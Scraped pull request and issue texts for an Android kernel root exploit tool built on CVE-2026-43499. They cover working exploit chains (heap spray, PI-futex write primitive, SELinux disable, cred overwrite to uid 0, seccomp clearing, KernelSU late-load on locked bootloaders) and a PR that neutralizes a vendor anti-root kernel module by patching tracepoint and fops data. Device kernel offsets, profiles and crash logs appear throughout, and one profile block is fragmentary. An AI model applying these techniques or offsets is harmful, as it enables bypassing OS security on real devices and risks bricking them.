- Offsets derived with ghostlock-extract (embedded kallsyms recovery, 106,783 symbols), independently cross-checked with a second kallsyms recovery tool; CVE-2026-43499 primitive **present** (`remove_waiter@0x10273e0 still uses current`)
- pselect waiter shift derived -2; KASLR slide 0 on the test device

## Verification

- Local gates: upstream `offsets_json.c` loader test asserting every symbol/shift/struct field (18/18 incl. wrong-release negative); `clang -fsyntax-only` over `main.c` with this entry registered — clean
- **Physical device**: full chain ran with these offsets via offsets.json injection — kernelsnitch mm leak, heap spray, PI route (pselect ret=10), W1 SELinux, W2 cred (uid=0), W3 seccomp clear, KernelSU late-load `exit=0`, `[+] KernelSU module loaded`, root helper wrote its KSU log as uid 0. Device: locked bootloader, root achieved purely by late-load.

## Notes

- No `kernel_phys_load` set (XRING runtime branch supplies 0x80200000); `STRUCT_OFFSETS_6_6` defaults match BTF on this build (task_cred 0x820, pi_blocked_on 0x938, tasks 0x550)

items.title: feat(anti-vrko): 接入完整反 vr.ko 流程 + 恢复 1.3 载荷功能 + 调整执行顺序（仅作建议，未做实际验证）
items.body:
# 完整适配反 vr.ko 逻辑 + 恢复 1.3 载荷功能 + 调整执行顺序

## ⚠️ 免责声明（请先读这一段）

**本 PR 仅作建议，未做实际验证。**

- 已完成的是**静态适配**与**编译验证**（aarch64 交叉编译通过、符号与字符串核对、APK 打包通过）。
- **未完成**真机运行验证：`neutralize_vr_probes` 的 `ok=1`、vr.ko 探针槽位定位、逐任务 tag 清除的实际效果，
  均**没有**在本机跑通确认。
- 因此本 PR 的所有改动都应视为**待验证的提案**，合并前请自行在目标设备上完整验证。
- 尤其：CFI 阶段涉及改写 `&ashmem_misc.fops` 与 `sys_exit` tracepoint 的 funcs 数组，
  属高危内核数据写；一旦地址推导有偏差，可能造成设备无法启动。**不要未经真机验证就分发。**

---

## 本 PR 做了什么

### 1. 接入参考仓库的完整反 vr.ko 流程

把 [CVE-2026-43499-Neo11Plus](https://github.com/boxiaolanya2008/CVE-2026-43499-Neo11Plus) 的反
vr.ko 两层机制完整接进本工程：

| 层 | 参考仓库位置 | 本工程落点 |
|---|---|---|
| 常驻内核读写（configfs fops 伪造 + pipe 物理读写） | `exploit/src/*` | `src/core/session/backend/cfi_stage.cpp` |
| 逐任务去 tag（`thread_info.flags` bit 0x400 + `task+0x06` / `task+0x2c`） | `root.c: patch_task_vr_tag` | `w2b` 阶段 |
| 探针外科手术式中和（读 `probestub`，按模块内 delta 定位 `sys_exit` 槽位，只改那一个槽） | `root.c: neutralize_vr` | `cfi_stage.cpp: neutralize_vr_probes` |

新增文件：
- `src/core/session/backend/cfi_layout.hpp`
- `src/core/session/backend/cfi_stage.hpp`
- `src/core/session/backend/cfi_stage.cpp`
- `src/core/tests/cfi_stage_test.cpp`

### 2. 恢复被 overlay 覆盖掉的 1.3 原载荷功能

`cve_2026_43499_backend.cpp` 在接入 overlay 时被整体替换（45 KB → 30 KB），
导致下列功能丢失，本 PR 全部补回：

- `bootimg::detect_device_brand_runtime`（品牌检测：属性优先，boot 字节回落）
- `bootimg::load_boot_image`（boot / vendor_boot / kcore 三路加载）
- `bootimg::probe_vrko_from_vendor_boot`（运行时解析 vr.ko 的 tag A/B 偏移）
- `bootimg::recover_sys_exit_tp_funcs`（profile 缺失时从内核内嵌 kallsyms/BTF 恢复）

**一处刻意的取舍**：把 `sys_exit.funcs` 指针整体清零的老式粗粒度写，用编译期开关
`GHOSTLOCK_LEGACY_SYSEXIT_KILLSWITCH` 默认**关闭**。原因是它与第 1 项的细粒度中和**硬冲突**：
`neutralize_vr_probes` 必须读 `sys_exit_tp.funcs[]` 才能定位 vr.ko 的模块内探针槽，
若先被整体清零，CFI 扫描会落空。解析/恢复逻辑全部保留并启用，只门住那一笔冲突的内核写。

### 3. 调整执行顺序：反 vr.ko 移到 KSU 移交之后

原顺序（会软重启）：

```
Backend(W1→W2→W3) → 【CFI + vr.ko 中和】 → Frontend handoff（ksud late-load 拿 root）
```

改后：

```
Backend(W1→W2→W3) → Frontend handoff（拿 root） → 【CFI + vr.ko 中和】
```

理由：CFI 阶段会替换 `&ashmem_misc.fops` 并改写 `sys_exit` 探针数组，
在 framework 尚未稳定、KernelSU 尚未接管时做这些，正是把设备带进软重启的时序。

改动位置：
- `src/core/session/backend/cve_2026_43499_backend.cpp`：移除 `run_cfi_stage<M>` 调用（留注释说明去向）
- `src/core/route/pipeline.hpp`：在 `Frontend::run()` 之后派发
  `session::backend::run_cfi_stage<Middleware>(exploit_session)`
- 顺带修正：KernelSU 本来就已 root 时（Backend 返 `Done`），现在也会执行反 vr.ko，
  不再直接 `DiagnosticStop` 返回

---

## Termux / aarch64 构建适配（3 处必须改）

overlay 的 `Makefile` 是按桌面 NDK 写的，在 Termux aarch64 上需要：

| 问题 | 修法 |
|---|---|
| 去掉了 Termux 回落，`NDK_ROOT` 为空 → 编译器路径变成 `/toolchains/...` | 提供 `NDK_ROOT` 指向一个假 NDK 目录；`aarch64-linux-android35-clang{,++}` 必须是**转发脚本**（不能做符号链接：Termux 包装器按自身目录找 `clang++`） |
| 硬编码 `-static-libstdc++`，Termux clang 会翻成 `-lc++_shared` → 链接失败 | 命令行覆盖 `LDFLAGS="-fPIE -pie -pthread -flto"` |
| `CXX_SRCS` 完全没列 `core/bootimg/*` → `detect_device_brand_runtime` 未定义 | 把 5 个 bootimg 源补进 `CXX_SRCS` |

---

## 编译验证结果（非真机运行验证）

- aarch64 交叉编译：**通过**，`build/native/ghostlock` = 259,768 B
- APK 打包：**BUILD SUCCESSFUL**，APK 内 `libghostlock.so` 与源码构建产物
  sha256 逐字节一致（`f912bc3f27096891`）
- 二进制标志串核对：`vr neutralize` ×12、`neutralized` ×2、`ghostlock_guard` ×5、
  `vendor_boot` ×16、`recovered tag_A` ×1

## 合并前建议补充的验证

1. 真机跑一次，确认出现：
   ```
   VR: recovered tag_A=0x.. tag_B=0x2c from ...
   vr neutralized: sys_exit probe slot=... func ...->... probestub=... ok=1
   ```
2. 确认 `dmesg` 不再出现 `scheduling while atomic`
3. 确认软重启后 `vr` 无法加载、`su` / KernelSU 不再被杀
4. `cmp_disasm` 对比攻击路径地址未漂移

items.title: unable to extract kernel_phys_load in some MediaTek devices
items.body:
For those users who try to extract the offsets, and failed 15 times of W1 attempt on MediaTek devices, this is because MediaTek models' system images does not contains kernel_phys_load, which is a necessary parameter. Leaving it null will let the app automatically use the default value, which is not correct on most MediaTek devices. And there is no way to do a static analysis to get it. The only way to get it is to use a rooted same machine to read out the parameters using root permission. 

For the device that is able to root in official ways, please read [how to get kernel_phys_* parameters on MediaTek devices](https://github.com/YuKongA/ghostlock-app/blob/main/docs/kernel_profiles/MEDIATEK.md)

items.title: tcp_zerocopy` route reports `success1` on HONOR 400 Smart (SM6375, kernel 6.1.99-…ab13565525) but the W1 write never lands; run ends in a kernel panic
items.body:
## Summary

`tcp_zerocopy` reports a fully clean route result on this device, but the W1 write never lands and the run
always ends in a kernel panic.

```
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done          <-- EDEADLK, every attempt
[*] tcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
[*] [route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[*] [T+4504ms]   PI route done
```

Observed across two full runs:

* the route stage completes with `success=1 status=0 clean=1/1 errno=0` **five times** in the latest run,
* yet W1 never advances to W2 (no W2 line anywhere), i.e. the write to
  `offset.selinux_enforcing = 0x22063F0` never takes effect,
* W1 just loops through its `w1_attempts=15` budget and the machine panics (attempt 5 of run A, attempt 6 of
  run B). Because the panic takes the machine down, the debug log is only written for runs that survive —
  most exported logs are 0 bytes or null-filled.

`errno=35` is `EDEADLK`, which in `futex_requeue_pi` is returned when the word at `*uaddr2` holds the calling
thread's TID, so `rt_mutex_start_proxy_lock()` is never reached. My reading is that the PI chain is never
armed, and `success=1` is therefore a false positive for this kernel.

---

## Device

| Field | Value |
|---|---|
| Model | HONOR 400 Smart (LGN-NX1 / LGN-N31S) |
| SoC | Qualcomm **SM6375** ("blair") |
| Build | `LGN-N31S 9.0.0.102D(DEMC819E6R1P1)`, base `LGN-LGRP18-OVS 9.0.0.102` |
| Android | 15 (SDK 35), MagicOS 9.0 |
| Kernel | `6.1.99-android14-11-g6567ab14ba0d-ab13565525` |
| Config | `CONFIG_MODULE_SIG=y` (`MODULE_SIG_FORCE` unset), `CONFIG_KPROBES=y`, no `SECURITY_LOCKDOWN_LSM`, `CFI_CLANG`, `SHADOW_CALL_STACK`, `ARM64_PTR_AUTH`, `PANIC_ON_OOPS=y` |
| SELinux | Enforcing; app path is `u:r:untrusted_app:s0`, `Seccomp=2 Seccomp_filters=1` |
| Bootloader | locked, dm-verity enforcing |

---

## Profile

Generated from the device's own `boot.img`; exact `uname -r` match, accepted by the app
(`profile: hasProfile=true invalid=0`), status **Supported / Profile ready**.

```
$ ghostlock-extract.exe image/boot.img --phys 0xa8000000 --format conf --out profile.conf

info: kallsyms layout pre-6.4 recovered (101152 symbols)
info: (CVE-2026-43499 primitive present (remove_waiter@0xff886c still uses current)
warning: waiter fits at the last usable word (shift=3); wake_state falls outside the copied fd_set and relies on the kernel zero-initialising it
info: pselect chain __arm64_sys_pselect6->core_sys_select frames=pselect=0x90 pselect=0x1c0 futex=0x70 futex=0x60 futex=0x1b0 buffer=0x50 waiter=0x98 shift=1 (derived 3 - 2)
info: sizeof(mm_struct)=0x3C0
```

`kernel_phys_load` had to be passed manually because this device's `xbl_config` has no FDT memory map
(`xbl_config FDT parse failed: xbl_config contains no unique NOMAP/Kernel memory map`).

Verified symbol table (from the same image) — matches the compiled profile exactly:

```
kimage_text_base = 0xffffffc008000000   compact_waiter = 1   mm_struct_sz = 1024   pselect_waiter_shift = 1
off_init_task 0x1FCED80   off_init_cred 0x1FE12A8   off_root_task_group 0x21B4580   off_selinux_enforcing 0x22063F0
off_selinux_blob_sizes 0x159F7C8   off_security_hook_heads 0x159F0B8
off_slide_boot_id 0x2227498   off_slide_loggers_0_1 0x1FC2918   off_slide_nfulnl_logger 0x1FC29C8
rt_mutex_waiter: tree=0 pi_tree=24 task=48 lock=56 wake_state=64 ww_ctx=80
```

Route analysis reports all three paths available, with `select_stack (high)` suggested:

```
path multicast_waiter   available (ip_mc_msfadd=absent ip_mc_source@0xffffffc008e81910)
path select_stack       available (core_sys_select@0xffffffc0083b5b60 futex_wait@0xffffffc0081a4f14)
path tcp_zerocopy       available (tcp_zerocopy_receive@0xffffffc008e4354c)
```

(For reference: of the 63 bundled profiles only five carry multicast keys, all `5.15.x`, so multicast is not
applicable on 6.1 here.)

The `tcp_zerocopy` profile used for these runs:

```hocon

schema_version = 1
kernel_major = 6
recommend_shizuku = 0
kernel_phys_load = 2818572288      # 0xA8000000
kernel_phys_offset = null

  tcp_zerocopy {
    compact_waiter = 1
  }
}

  to = "select_stack"

    }

}

              real_cred=2096 cred=2104 comm=2120 tasks=1360 seccomp=2304 }

         selinux_enforcing=35677168 selinux_blob_sizes=22673352 security_hook_heads=22671544

```

---

## Run B (attached in full, 14054 bytes / 221 lines)

```
[*] W1: SELinux attempt 1/15
[*] === W1: SELinux === target=0xffffff802a2063f0 mode=1 leaf=0
[*] prepare_kernel_page ok attempt=2 +3791ms
[*] tcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
[*] [route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[*] [T+6497ms]   PI route done
[*] W1: SELinux attempt 2/15
[-]   heap spray failed
[-] W1: SELinux attempt 2 route failed; backing off
[*] W1: SELinux attempt 3/15
[*] prepare_kernel_page ok attempt=1 +1592ms
[*] tcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
[*] [T+17477ms]   PI route done
[*] W1: SELinux attempt 4/15
[*] prepare_kernel_page ok attempt=4 +5719ms
[*] tcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
[*] [T+25586ms]   PI route done
[*] W1: SELinux attempt 5/15
[*] prepare_kernel_page ok attempt=1 +1491ms
[*] tcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
[*] [T+29474ms]   PI route done
[*] W1: SELinux attempt 6/15
[*] prepare_kernel_page ok attempt=1 +1395ms
[*] [T+31021ms]   heap spray done
[*] [route] waiter parked; owner started
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
   >>> log ends here (machine panicked mid-attempt 6)
```

| W1 attempt | prepare_kernel_page | tcp route result |
|---|---|---|
| 1 | ok (attempt 2) | `success=1 status=0 clean=1/1 errno=0` |
| 2 | — | heap spray failed |
| 3 | ok (attempt 1) | `success=1 status=0 clean=1/1 errno=0` |
| 4 | ok (attempt 4) | `success=1 status=0 clean=1/1 errno=0` |
| 5 | ok (attempt 1) | `success=1 status=0 clean=1/1 errno=0` |
| 6 | ok (attempt 1) | panicked mid-route |

Run A (also attached) is the same shape with three clean route completions; `select_stack` instead of
`tcp_zerocopy` reaches `CMP_REQUEUE_PI errno=35` and never enters a route loop (run survives or is SIGKILLed
with `code=137`).

---

## What was tried

* `select_stack` with `waiter_shift = 1` and with `waiter_shift = 0` — same `EDEADLK`, no route loop.
* `tcp_zerocopy` with `compact_waiter = 1` + `select_stack` fallback — route runs and reports clean 5×,
  W1 still never verifies, run panics.
* An `execution { ... }` block in the imported profile is rejected ("profile needs correction"), and the app
  exposes no UI for `execution.*` on an imported profile here (Parameter configuration shows only
  "Load configuration" / "Profile documentation").
* The `ghostlock` CLI can't be used for comparison: `--load-prebuilt-profile profile.conf` returns
  `[!] cannot load profile` (it appears to want the compiled `.bin`, which only the app writes).
* Memory is tight on this device (`Mem: 3551 MB total, 3495 used, 30-173 MB free`); one earlier run was
  killed with `native exited code=137` (SIGKILL) during a second spray before reaching the route.

---

## Question

1. Which route is correct for `6.1.99-android14-11-g6567ab14ba0d-ab13565525` (HONOR/SM6375)? The extractor
   suggests `select_stack` but also warns its geometry is degraded (`wake_state falls outside the copied
   fd_set`), while `tcp_zerocopy` runs further before panicking.
2. Is `errno=35` at the first `CMP_REQUEUE_PI` expected to be followed by a **successful** route report, or
   does it mean the route was never armed (making `success=1 clean=1/1` misleading)?
3. If the route is armed, what would make the W1 write at `offset.selinux_enforcing = 0x22063F0` fail to take
   effect while the route reports clean? That offset is derived by symbol rather than BTF member — should it
   point elsewhere on this kernel?
4. Is the `stores an even byte over selinux_state.initialized` rejection (all four candidates on some attempts,
   succeeding on attempt 1/2/4 of others) a symptom of the same cause or an independent quirk?
5. Is a build with an incremental/flushing debug log possible? The log is written only at the end, so any run
   that panics leaves a 0-byte or null-filled log, which makes remote debugging hard.

Happy to run any additional diagnostic build, and/or collect `/proc/iomem`, `dmesg`, or a
`ghostlock-extract --analysis` dump for this kernel on request.

items.title: Samsung Galaxy A16 5G (SM-A166P, MT6835, 5.15.167-android13-8-31184353): W1 write misses, ~50% panic rate
items.body:
Related: #293 (same Samsung GKI 5.15 signature).

## Device

- SM-A166P (Galaxy A16 5G, MT6835), XID, bootloader locked
- Firmware A166PXXS5BYG1 (One UI 7.0, Android 15, July 2025 SPL)
- Kernel `5.15.167-android13-8-31184353` (built 2025-07-04)
- Binary: GhostLock 1.2+549 build 2026-10-05 (pre-release)

## Extraction

From stock AP `boot.img` (v4, gzip kernel, no DTB):

```
warning: BTF strings table extends past the declared str_len by 0x2 bytes
info: kallsyms layout pre-6.4 recovered (121348 symbols)
info: (CVE-2026-43499 primitive present (remove_waiter@0x15d2234 still uses current)
warning: _text=0xffffffc008000000 does not match the mtk DRAM-base mapping
warning: pselect_waiter_shift derivation failed: futex waiter stack local not unique: [("x27", 152), ("x24", 8)]
info: nf_logger loggers=0x2891cd0 nfulnl_logger=0x2891da8 ulog=1 slot=0x2891cd8
info: sizeof(mm_struct)=0x3E0 (MM_STRUCT_SZ=0x500 in src/core/common.h)
info: multicast waiter_off derived = 0x40 (setsockopt depth 0x318 - futex depth 0x2d8)
missing: struct_slab_cache
```

Profile complete except `struct_slab_cache`. Device kernel source is public
(`Kernels-by-ravindu644/samsung_kernel_a166p`), so this can be verified.

## `_text` mismatch is the 5.15 GKI link base

From the device's own source, `CONFIG_ARM64_VA_BITS=39`:

- `PAGE_OFFSET = -(1<<39) = 0xFFFFFF8000000000`
- `MODULES_VADDR = -(1<<38) = 0xFFFFFFC000000000`
- `KIMAGE_VADDR = MODULES_END = 0xFFFFFFC008000000` → `_text = 0xffffffc008000000`

Runtime `kImageTextBase = 0xffffffc080000000` (6.1 MTK convention) is 0x7F800000
above this. Image header: `text_offset=0x0`, `image_size=0x3570000`, `flags=0xa`.
No DTB in boot.img, so DRAM base is not derivable offline.

## Overrides

- `kernel_phys_load = 0x40200000` (runtime prints `0x401ff000`, i.e. −0x1000 — intentional?)
- `kernel_phys_offset = 0x40000000`
- geometry from extractor: `waiter_off=64, buffer_size=264, task_offset=48, lock_offset=56, compact_waiter=1`
- `fallback = none` (multicast route)

Resolved addresses are self-consistent: every printed address equals
`PAGE_OFFSET + (load − offset) + off`:

```
p0 profile ... phys_offset=0000000040000000 kernel_phys_load=00000000401ff000
    delta=00000000001ff000 slide_logger=ffffff8002a90da8 bootid_data=ffffff8003686321
    init_task=ffffff8003286740
W1: SELinux target=0xffffff80035e9e00 mode=1 leaf=0
```

## Runs

| # | Context | waiter_off | Result |
|---|---|---|---|
| 0 | app, no overrides | runtime fallback 0x80000000/0x80000000 | instant panic, logs all NUL |
| 1 | app | 64 | spray OK, mm leaked, `prepare_kernel_page ok`, route `success=1` → `Write 1 failed`, exit 1, no panic |
| 2 | shell, right after boot (load ~30) | 64 | panic during CMP_REQUEUE_PI |
| 3 | shell, settled | 64 | route `success=1`, verify (shell can read selinuxfs) reads `1` → write did not land |
| 4 | shell | 96 | `setsockopt` fails `step=61 errno=99` (EADDRNOTAVAIL) → panic |

Run 3 log tail:

```
[*] === W1: SELinux === target=0xffffff80035e9e00 mode=1 leaf=0
[*] [spray] mm_struct leaked=0xffffff8051c10800
[*] prepare_kernel_page ok attempt=1
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[*] multicast route status=0 clean=1/1 step=0 errno=0
[*] mcast ghost disarm ret=-1 errno=110
[*] [route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[-] Write 1 failed
```

## Facts

1. `untrusted_app` cannot open `/sys/fs/selinux/enforce` (Samsung sepolicy) →
   `check_selinux_off()` can never verify from the app. Shell (uid 2000) can.
2. Run 3 proves the write misses `selinux_state.enforcing` — verification works
   from shell and the byte is unchanged.
3. `waiter_off=0x60` is rejected by `setsockopt` before waiter processing and
   panics; `0x40` completes but never lands. Panic rate ≈ 50%, always at the
   race stage.
4. Defconfig: `CONFIG_SECURITY_SELINUX_DEVELOP=y`, `CONFIG_RKP=y`,
   `CONFIG_SECURITY_DEFEX=y`, `CONFIG_MODULE_SIG=y` without
   `CONFIG_MODULE_SIG_FORCE`, no `UH_LKM_BLOCK`.

## Questions

1. How to validate the multicast parse offset for Samsung/MTK GKI 5.15 builds
   without live trial-and-error?
2. Besides `selinux_state.initialized`, which `.data` neighbors must the
   overwritten page preserve on Samsung kernels? (Runs 2/4 panic pattern looks
   like neighbor corruption.)
3. Does `_text = 0xffffffc008000000` require runtime adjustment beyond the
   `kernel_phys_load`/`kernel_phys_offset` overrides, given image-domain
   addresses are computed off the hardcoded `0xffffffc080000000`?
4. Is the `kernel_phys_load` −0x1000 normalization intentional?

Can test patch builds on this device. Full logs, merged GLK1 `profile.bin`,
extracted `kernel_Image` available on request.

可能的根因猜测

1. native 内部对 pipe_inode_info 或 pipe_buffer 环形缓冲的布局假设与荣耀内核不匹配：从 pipe_write 反汇编看，pipe_buffer 本身布局是标准的，但 pipe_inode_info->bufs 数组偏移、head/tail 掩码、max_usage 等字段可能与 native 硬编码值不同。
2. 物理地址转换逻辑不匹配：MTK 平台 kernel_phys_load = 0x80000000 可能是对的（KASLR 成功），但 native 在 direct_to_page 转换时可能使用了错误的 P0_PAGE_OFFSET 或 vmemmap 步长。
